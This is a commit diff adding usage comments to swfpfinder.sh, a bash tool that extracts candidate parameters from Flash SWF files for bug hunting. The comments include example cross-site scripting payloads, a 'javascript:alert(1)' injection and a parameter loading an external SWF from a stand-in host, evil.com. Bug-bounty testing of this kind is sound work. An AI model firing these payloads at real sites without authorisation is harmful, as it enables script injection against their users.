bde241c7c82b5fa34216982b6292f89cd253fc3c
m4ll0k (mallok) <m4ll0k@protonmail.com>
2020-08-14 16:29:10 +0200

    Update swfpfinder.sh

--- swfpfinder.sh
+++ swfpfinder.sh
@@ -2,7 +2,28 @@
 #
 # SWFPFinder - SWF Potential Parameters Finder
 # by M'hamed Outaadi (@m4ll0k)
+# 
+# SWFPFinder is a simple and open source bash script designed to discovery the potential swf (file) parameters on the webapp analysing the swf file. 
+# SWFPFinder use swfmill tool, swfmill is a tool to process Adobe Flash (SWF) files. It can convert SWF from and to an XML dialect called “swfml”, 
+# which is closely modeled after the SWF file format.
 
+# Requirements
+# for linux: apt-get install swfmill
+# for macos: brew install swfmill
+
+# Usage:
+# this tool you can use it during bug hunting for find a potential swf parameters..
+
+# $ bash swfpfinder.sh https://hackerone-target.com/hackme.swf
+#   load_external-swf-file
+#   inject-me
+#   blabla
+#   ...
+
+# after find potential parameters:
+
+#  https://hackerone-target.com/hackme.swf?inject-me=javascript:alert(1) 
+#  https://hackerone-target.com/hackme.swf?load_external-swf-file=https://www.evil.com/xss.swf
 
 function setup(){
 	swfmill=$(which swfmill)
